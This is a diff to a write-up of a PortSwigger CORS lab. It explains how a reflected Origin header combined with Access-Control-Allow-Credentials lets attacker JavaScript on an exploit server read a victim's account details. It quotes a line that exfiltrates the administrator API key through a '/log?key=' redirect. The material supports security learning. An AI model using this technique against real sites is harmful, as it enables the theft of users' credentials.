@@ -1,6 +1,6 @@
 # [CORS vulnerability with basic origin reflection](https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack)
 
-> login the site and during the login there will be a request to the `/accountDetails`, in the response there is a header `Access-Control-Allow-Credentials: true` that indicates it might support `CORS` and it let any credentials/logs cross to any other allowed origin
+> login the site and after the login there will be a request to the `/accountDetails`, in the response there is a header `Access-Control-Allow-Credentials: true` that indicates it might support `CORS` and it let any credentials/logs cross to any other allowed origin
 
 - in Burp Repeater add to the request `Origin: https://example.com`
 - in the response there is the header `Access-Control-Allow-Origin: https://example.com`
@@ -22,8 +22,11 @@
 </script>
 ```
 
-- the `req.withCredentials = true;` in the request will tell the response should send the victim credentials like the cookies, and the browser attach the origin to the request, since the that is th only credentials that the server needs it will accept the `https://www.expoit-serve.com` as origin.
-- the `location = "/log?key=" + this.responseText;` works because of the `Access-Control-Allow-Credentials: true`
+- `req.withCredentials = true` tells the browser to include the victim's cookies with the cross-origin request.
+- The server returns the account details and reflects `Origin: https://exploit-server.com` in `Access-Control-Allow-Origin`.
+- Because that matches the requesting origin and `Allow-Credentials: true` is set, the browser lets the attacker's JavaScript read `this.responseText`, which contains the API key.
+- The script then exfiltrates it by redirecting to `/log?key=`.
+- CORS is enforced by the browser, not the server.
 
 > deliver it to the victim and then view the exploit, in the logs there will be the administrator api key (in this lab the admin will receive the exploit)
 
